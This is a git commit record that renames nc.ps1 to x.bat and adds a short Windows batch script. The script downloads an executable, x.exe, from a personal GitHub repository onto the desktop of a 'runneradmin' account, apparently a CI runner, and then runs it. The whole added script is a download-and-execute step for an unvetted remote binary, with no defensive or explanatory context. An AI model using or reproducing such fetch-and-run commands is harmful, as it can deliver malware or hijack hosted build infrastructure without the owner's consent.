929a08712bf7991783122a055bd028ab24fcfaac
mi0nrio <baytout4@outlook.com>
2024-11-15 21:50:33 +0100

    Update and rename nc.ps1 to x.bat

---
+++ w10/x.bat
@@ -0,0 +1,9 @@
+@echo off
+REM Download x.exe using curl
+curl -L -o "C:\Users\runneradmin\Desktop\x.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"
+
+REM Execute x.exe
+"C:\Users\runneradmin\Desktop\x.exe"
+
+REM Pause to view output
+pause
